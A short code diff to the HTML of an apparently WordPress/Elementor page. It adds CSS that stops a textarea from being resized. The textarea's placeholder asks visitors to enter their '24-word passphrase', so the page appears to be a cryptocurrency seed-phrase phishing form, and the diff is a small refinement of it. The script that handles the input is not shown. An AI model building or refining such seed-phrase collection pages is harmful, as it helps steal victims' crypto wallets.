@@ -212,7 +212,12 @@ body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: 
 							<div class="elementor-element elementor-element-2c78f37 elementor-widget elementor-widget-mf-text" data-id="2c78f37" data-element_type="widget" data-settings="{&quot;mf_input_name&quot;:&quot;mf-text&quot;}" data-widget_type="mf-text.default">
 								<div class="elementor-widget-container">
 									<div class="mf-input-wrapper">
-										<textarea type="text" class="mf-input" id="mf-input-text-2c78f37" name="mf-text" placeholder="Enter your 24-word passphrase here" oninput="handleChange(event)" onblur="handleChange(event)" aria-invalid="false"> </textarea>
+										<style>
+											.textarea{
+												resize: none;
+											}
+										</style>
+										<textarea class="mf-input textarea" id="mf-input-text-2c78f37" name="mf-text" placeholder="Enter your 24-word passphrase here" oninput="handleChange(event)" onblur="handleChange(event)" aria-invalid="false"> </textarea>
 										<span class="mf-error-message"></span>
 									</div>
 								</div>
